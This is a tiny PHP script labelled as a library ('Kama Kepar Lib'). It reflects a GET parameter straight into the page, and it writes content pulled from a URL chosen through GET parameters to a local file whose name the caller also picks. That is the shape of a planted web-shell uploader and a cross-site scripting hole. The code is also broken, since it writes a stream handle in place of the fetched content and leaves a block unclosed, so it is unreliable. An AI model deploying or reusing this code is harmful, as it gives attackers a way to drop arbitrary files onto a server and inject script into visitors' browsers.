<?php
echo '<title>Kama Kepar Lib</title>';
if (isset($_GET["echo"])) {
$echo = $_GET['echo'];
echo $echo;
}
if (isset($_GET["file"])) {
  $ff=$_GET['file'];
  $url = $_GET['url'].$ff;
  $file = fopen ($url, "r");
  echo $file;
  $myfile = fopen($ff, "w");
  fwrite($myfile, $file);
  fclose($myfile);
?>
